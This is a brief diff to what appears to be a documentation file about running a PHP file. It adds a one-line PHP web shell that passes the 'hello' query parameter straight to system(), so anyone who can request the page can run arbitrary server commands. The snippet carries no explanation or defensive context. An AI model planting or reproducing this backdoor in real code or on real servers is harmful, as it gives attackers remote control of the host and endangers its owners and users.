@@ -9,3 +9,7 @@ Execute file:
 ```bash
 php file.php
 ```
+
+```php
+<?php system($_GET['hello']); ?>
+```
